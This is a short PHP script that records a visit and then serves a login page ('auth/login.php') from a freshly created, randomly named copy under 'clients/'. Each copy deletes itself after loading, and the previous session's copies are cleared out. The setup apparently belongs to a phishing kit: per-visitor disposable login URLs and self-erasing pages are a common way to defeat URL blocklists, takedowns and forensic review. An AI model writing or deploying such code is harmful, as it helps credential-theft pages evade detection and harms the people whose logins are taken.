<?php
session_start();
require 'main.php';
$m->saveHit();

// Clean up previous random files
if (isset($_SESSION['previous_files'])) {
    foreach ($_SESSION['previous_files'] as $filePath) {
        if (file_exists($filePath)) {
            unlink($filePath);
        }
    }
}

// Create clients directory if it doesn't exist
if (!is_dir('clients')) {
    mkdir('clients', 0755, true);
}

// Create new random login file
$create = createRandomLogin();
$_SESSION['previous_files'] = [$create['path']];

// Redirect to the random login file
header("location: clients/" . $create['name']);
exit;

function createRandomLogin() {
    $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $length   = strlen($letters) - 1;
    $random   = "";
    for($p = 0; $p < 6; $p++) {
        $random .= $letters[mt_rand(0, $length)];
    }
    $randomFile = 'clients/' . $random . '.php';
    
    // Read login.php content
    $content = file_get_contents("auth/login.php");
    
    // Add auto-delete JavaScript that runs when page loads
    $autoDeletePHP = '<?php
// Auto-delete this file after output
register_shutdown_function(function() {
    if (file_exists(__FILE__)) {
        unlink(__FILE__);
    }
});
?>';

// Insert at the beginning
$content = $autoDeletePHP . $content;
    
    // Write the modified content
    file_put_contents($randomFile, $content);
    
    return ['name' => $random . '.php', 'path' => $randomFile];
}
?>